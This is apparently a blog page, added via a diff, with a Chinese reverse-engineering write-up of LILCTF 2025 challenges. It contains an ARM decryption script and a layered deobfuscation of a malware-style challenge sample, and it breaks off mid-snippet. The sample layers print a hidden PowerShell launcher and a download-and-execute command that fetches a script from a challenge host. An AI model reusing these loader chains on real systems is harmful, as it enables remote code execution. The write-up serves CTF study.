@@ -1,0 +1,956 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
+  <link rel="icon" href="/img/tubiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="J1NXEM">
+  <meta name="keywords" content="zh-CN">
+  
+    <meta name="description" content="LILCTF 2025ARM ASM先用jadx看，找到密文  反编译so文件，找到主函数，这里一共分为三处加密，第一处通过t表进行重新排列和按位xor，第二处对每三字节进行左循环移3位，右循环移1位，不变的变换，第三处用base64变表的加密  这里可以找到t表的内容  将以上加密过程逆过来写解密 1234567891011121314151617181920212223242526272829">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LILCTF2025逆向题解">
+<meta property="og:url" content="https://j1nxem-o.github.io/2025/08/28/LILCTF2025%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="J1NXEM&#39;s blog">
+<meta property="og:description" content="LILCTF 2025ARM ASM先用jadx看，找到密文  反编译so文件，找到主函数，这里一共分为三处加密，第一处通过t表进行重新排列和按位xor，第二处对每三字节进行左循环移3位，右循环移1位，不变的变换，第三处用base64变表的加密  这里可以找到t表的内容  将以上加密过程逆过来写解密 1234567891011121314151617181920212223242526272829">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925628.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925646.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231926445.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206409.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200048966.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207769.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206400.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200101149.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200103384.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207412.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206270.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207226.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206365.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207332.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200141258.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200136669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200143267.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207773.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207376.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200155829.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236627.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236128.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272239519.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203539.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203463.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272229434.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272250249.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272251990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272245175.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280109207.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280110775.png">
+<meta property="article:published_time" content="2025-08-27T17:49:14.000Z">
+<meta property="article:modified_time" content="2025-08-27T17:50:49.521Z">
+<meta property="article:author" content="J1NXEM">
+<meta property="article:tag" content="ctf-reverse-wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925628.png">
+<meta name="twitter:creator" content="@J1NXEM">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>LILCTF2025逆向题解 - J1NXEM&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://fontsapi.zeoseven.com/323/main/result.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"j1nxem-o.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J1NXEM’s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wenzhang.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LILCTF2025逆向题解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J1NXEM
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-28 01:49" pubdate>
+          2025年8月28日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">LILCTF2025逆向题解</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-08-28T01:50:49+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="LILCTF-2025"><a href="#LILCTF-2025" class="headerlink" title="LILCTF 2025"></a>LILCTF 2025</h1><h2 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h2><p>先用jadx看，找到密文</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925628.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>反编译so文件，找到主函数，这里一共分为三处加密，第一处通过t表进行重新排列和按位xor，第二处对每三字节进行左循环移3位，右循环移1位，不变的变换，第三处用base64变表的加密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925646.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里可以找到t表的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231926445.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>将以上加密过程逆过来写解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">CUSTOM = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span><br><br>decode_map = &#123;ch:i <span class="hljs-keyword">for</span> i,ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CUSTOM)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_b64decode</span>(<span class="hljs-params">s</span>):<br>    out = <span class="hljs-built_in">bytearray</span>()<br>    buf=[]; pad=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&#x27;=&#x27;</span>:<br>            pad += <span class="hljs-number">1</span>; buf.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            buf.append(decode_map[ch])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf)==<span class="hljs-number">4</span>:<br>            b0 = (buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">2</span>) | (buf[<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">4</span>)<br>            b1 = ((buf[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xF</span>)&lt;&lt;<span class="hljs-number">4</span>) | (buf[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">2</span>)<br>            b2 = ((buf[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">3</span>)&lt;&lt;<span class="hljs-number">6</span>) | buf[<span class="hljs-number">3</span>]<br>            out.extend([b0,b1,b2])<br>            buf=[]<br>    <span class="hljs-keyword">if</span> pad: out = out[:-pad]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&gt;&gt;r) | ((x &amp; ((<span class="hljs-number">1</span>&lt;&lt;r)-<span class="hljs-number">1</span>))&lt;&lt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&lt;&lt;r) | (x&gt;&gt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_neon_block</span>(<span class="hljs-params">Y, t</span>):<br>    z = [ y ^ (t[k] &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> k,y <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Y) ]<br>    X = [<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> k,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(t):<br>        X[j] = z[k]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(X)<br><br>enc = <span class="hljs-string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span><br><br>data = custom_b64decode(enc)<br><br>buf = <span class="hljs-built_in">list</span>(data)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    buf[j]   = ror(buf[j],   <span class="hljs-number">3</span>)<br>    buf[j+<span class="hljs-number">1</span>] = rol(buf[j+<span class="hljs-number">1</span>], <span class="hljs-number">1</span>)<br>after_neon = <span class="hljs-built_in">bytes</span>(buf)<br><br><br>t0 = [<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>]<br>t2 = [v ^ <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> t0]<br><br>X0 = inv_neon_block(after_neon[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>],  t0)<br>X1 = inv_neon_block(after_neon[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>], t0)<br>X2 = inv_neon_block(after_neon[<span class="hljs-number">32</span>:<span class="hljs-number">48</span>], t2)<br><br>orig = (X0+X1+X2).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(orig)<br><span class="hljs-comment"># -&gt; LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>用vs看文本内容，得到看到这一串js代码，提取出来，发现这一段有好多混淆，这里我是利用python一步步解混淆的，可以直接梭，由于代码太长就不贴出来了</p>
+<p>这是初始代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">resizeTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">moveTo</span>(-<span class="hljs-number">9999</span>, -<span class="hljs-number">9999</span>); <span class="hljs-variable constant_">SK</span>=<span class="hljs-number">102</span>;<span class="hljs-variable constant_">UP</span>=<span class="hljs-number">117</span>;tV=<span class="hljs-number">110</span>;<span class="hljs-title class_">Fx</span>=<span class="hljs-number">99</span>;nI=<span class="hljs-number">116</span>;pV=<span class="hljs-number">105</span>;wt=<span class="hljs-number">111</span>;<span class="hljs-variable constant_">RV</span>=<span class="hljs-number">32</span>;wV=<span class="hljs-number">82</span>;<span class="hljs-title class_">Rp</span>=<span class="hljs-number">106</span>;kz=<span class="hljs-number">81</span>;<span class="hljs-variable constant_">CX</span>=<span class="hljs-number">78</span>;<span class="hljs-variable constant_">GH</span>=<span class="hljs-number">40</span>;<span class="hljs-variable constant_">PS</span>=<span class="hljs-number">70</span>;<span class="hljs-variable constant_">YO</span>=<span class="hljs-number">86</span>;kF=<span class="hljs-number">75</span>;<br>......<br><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">SxhM</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>解出第一步，中间内容省略（太长了）</p>
+<p>这里贴出解出第一步代码的主要逻辑</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ioRjQN</span>(<span class="hljs-params">FVKq</span>)&#123;<br>    <span class="hljs-keyword">var</span> ohyLbg= <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> emGK = <span class="hljs-number">0</span>; emGK &lt; <span class="hljs-title class_">FVKq</span>.<span class="hljs-property">length</span>; emGK++)&#123;<br>        <span class="hljs-keyword">var</span> ndZC = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-title class_">FVKq</span>[emGK] - <span class="hljs-number">601</span>);<br>        ohyLbg = ohyLbg + ndZC<br>    &#125;<br>    <span class="hljs-keyword">return</span> ohyLbg<br>&#125;;<br><br><span class="hljs-keyword">var</span> ohyLbg = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">713</span>, <span class="hljs-number">712</span>, <span class="hljs-number">720</span>, ... , <span class="hljs-number">642</span>]);<br><span class="hljs-comment">// 这里 ohyLbg 就是被解密出来的实际 payload</span><br><br><span class="hljs-keyword">var</span> emGK = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">688</span>,<span class="hljs-number">684</span>,<span class="hljs-number">700</span>,<span class="hljs-number">715</span>,<span class="hljs-number">706</span>,<span class="hljs-number">713</span>,<span class="hljs-number">717</span>,<span class="hljs-number">647</span>,<span class="hljs-number">684</span>,<span class="hljs-number">705</span>,<span class="hljs-number">702</span>,<span class="hljs-number">709</span>,<span class="hljs-number">709</span>]);<br><span class="hljs-comment">// 这里解密出来的是一个 ActiveX 对象名字，例如 &quot;WScript.Shell&quot;</span><br><br><span class="hljs-keyword">var</span> ioRjQN = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(emGK);<br>ioRjQN.<span class="hljs-title class_">Run</span>(ohyLbg, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p>第二层解出是一个powershell命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-ep</span> Unrestricted <span class="hljs-literal">-nop</span> `<br><span class="hljs-variable">$EFTE</span> = (<br>  [<span class="hljs-type">regex</span>]::Matches(<br>    <span class="hljs-string">&#x27;a5a9b49fb8adbe...（一大串16进制字符）...&#x27;</span>, <span class="hljs-string">&#x27;.&#123;2&#125;&#x27;</span><br>  ) | % &#123;<br>    [<span class="hljs-built_in">char</span>]([<span class="hljs-type">Convert</span>]::ToByte(<span class="hljs-variable">$_</span>.Value,<span class="hljs-number">16</span>) <span class="hljs-operator">-bxor</span> <span class="hljs-string">&#x27;204&#x27;</span>)<br>  &#125;<br>) <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><br>&amp; <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">3</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>十六进制字符串 (<code>a5a9b49fb8adbe...</code>)被正则分成 2 位一组（即 <code>&quot;a5&quot;</code>, <code>&quot;a9&quot;</code>, <code>&quot;b4&quot;</code>…）。</p>
+<p>转成字节再异或 204</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">Convert</span>]:<span class="hljs-link">:ToByte($_.Value,16) -bxor 204</span><br></code></pre></td></tr></table></figure>
+
+<p>拼接成字符串，得到一个完整的命令&#x2F;脚本，赋值给 <code>$EFTE</code>。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&amp; <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>拿 <code>$EFTE</code> 前 3 个字符作为程序名（可能是 <code>&quot;cmd&quot;</code> 或 <code>&quot;iex&quot;</code>）。</li>
+<li>剩下部分是参数&#x2F;脚本。</li>
+<li>最后动态执行。</li>
+</ul>
+<p>解密这一层得到第三层代码，</p>
+<p>这段代码在隐藏窗口下启动powershell，然后执行’http:&#x2F;&#x2F;…&#x2F;bestudding.jpg，我们可以直接在浏览器窗口下载这个jpg</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&#x27;-w&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;-ep&#x27;</span>,<span class="hljs-string">&#x27;Unrestricted&#x27;</span>,<span class="hljs-string">&#x27;-Command&#x27;</span>,<span class="hljs-string">&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:40341/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member)[2].Name).Invoke(<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>将图片用vs打开查看文本内容，得到这么一串</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-string">&#x27;(&#x27;</span> | % &#123; <span class="hljs-variable">$r</span> = + <span class="hljs-variable">$</span>() &#125; &#123; <span class="hljs-variable">$u</span> = <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$b</span> = ++ <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$q</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$z</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$o</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$d</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$h</span> = (<span class="hljs-variable">$r</span> = <span 